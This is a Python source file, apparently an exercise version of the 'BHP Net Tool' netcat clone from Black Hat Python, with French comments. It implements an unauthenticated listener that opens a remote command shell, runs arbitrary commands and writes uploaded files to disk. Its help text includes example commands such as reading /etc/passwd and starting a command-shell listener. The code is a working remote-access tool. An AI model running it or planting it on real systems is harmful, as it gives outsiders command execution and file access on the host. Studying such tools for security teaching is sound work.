import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),stderr=subprocess.STDOUT)
    return output.decode()


class NetCat:
    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.args.listen:
            self.listen()
        else:
            self.send()

    def send(self):
        try:
            print(f"[*] Connecting to {self.args.target}:{self.args.port} ...")
            self.socket.connect((self.args.target, self.args.port))
            print("[+] Connected.")
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return

        # --- cas données pipées (echo ... | python netcat.py ...)
        if self.buffer:
            try:
                self.socket.sendall(self.buffer)
            except Exception as e:
                print(f"[-] Erreur en envoi du buffer: {e}")
                self.socket.close()
                return

            # Lecture de la réponse puis sortie (on ne passe pas en mode interactif)
            try:
                # On peut mettre un timeout court pour éviter de "mouliner" si le serveur garde la connexion
                self.socket.settimeout(2.0)
                response_parts = []
                while True:
                    try:
                        data = self.socket.recv(4096)
                    except socket.timeout:
                        # plus de données pendant le timeout -> considérer la réponse terminée
                        break
                    if not data:
                        # connexion fermée par le serveur
                        break
                    response_parts.append(data.decode(errors='ignore'))
                    # si moins que 4096 on relit jusqu'au timeout pour récupérer le reste éventuel
                    if len(data) < 4096:
                        continue
                full = ''.join(response_parts)
                if full:
                    # affiche sans ajouter de ligne supplémentaire
                    print(full, end='')
            except Exception as e:
                print(f"[-] Erreur en réception: {e}")
            finally:
                self.socket.close()
                return

        # --- cas interactif (pas de buffer pipé)
        try:
            while True:
                recv_len = 1
                response = ''
                # lecture non-bloquante logique: on lit tout ce que le serveur envoie pour l'afficher
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    if recv_len:
                        response += data.decode(errors='ignore')
                    if recv_len < 4096:
                        break
                if response:
                    print(response, end='')

                # n'entrer en mode input() que si stdin est un TTY (terminal)
                if sys.stdin.isatty():
                    try:
                        buffer = input('> ')
                    except EOFError:
                        # stdin fermé/EOF -> sortir proprement
                        break
                    buffer += '\n'
                    try:
                        self.socket.sendall(buffer.encode())
                    except BrokenPipeError:
                        break
                else:
                    # stdin non interactif -> on ne peut rien envoyer, on sort
                    break
        except KeyboardInterrupt:
            print('User terminated.')
        finally:
            self.socket.close()
            sys.exit()

    def listen(self):
        print('listening')
        self.socket.bind((self.args.target, self.args.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()
        
    def handle(self, client_socket):
        print(f"[+] Connexion réussie avec {client_socket.getpeername()}")
        if self.args.execute:
            print("[*] Exécution d'une commande unique...")
            output = execute(self.args.execute)
            client_socket.sendall(output.encode())

        elif self.args.upload:
            print(f"[*] Réception d'un fichier vers {self.args.upload} ...")
            file_buffer = b''
            while True:
                data =client_socket.recv(4096)
                if data:
                    file_buffer += data
                    print(f"   > {len(file_buffer)} octets reçus")
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f"[+] Fichier sauvegardé sous {self.args.upload}"
            client_socket.sendall(message.encode())

        elif self.args.command:
            print("[*] Attente de commande depuis le shell distant...")
            print("[+] Shell distant initialisé avec succès !")
            cmd_buffer = b''
            while True:
                try:
                    client_socket.sendall(b' #> ')
                    # collecte jusqu'au saut de ligne (recherche sur bytes)
                    while b'\n' not in cmd_buffer:
                        chunk = client_socket.recv(64)
                        if not chunk:
                            # client closed connection
                            return
                        cmd_buffer += chunk
                    # découpe la commande (incluant le '\n'), on retire l'éventuel '\r' et '\n'
                    cmd_line, _, remainder = cmd_buffer.partition(b'\n')
                    cmd_buffer = remainder  # ce qui reste après la commande
                    cmd_text = cmd_line.decode(errors='ignore').strip()
                    response = execute(cmd_text)
                    if response:
                        client_socket.sendall(response.encode())
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 " echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 " connect to server
        '''))
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specific command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specific port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specific IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()
    if args.listen:
        buffer = None
    else:
        # only read stdin if data is piped (non-interactive); avoid blocking when running interactively
        if sys.stdin.isatty():
            buffer = None
        else:
            buffer = sys.stdin.read()
    # encode buffer only if present
    if buffer is None:
        buf = None
    else:
        buf = buffer.encode()

    nc = NetCat(args, buf)
    nc.run()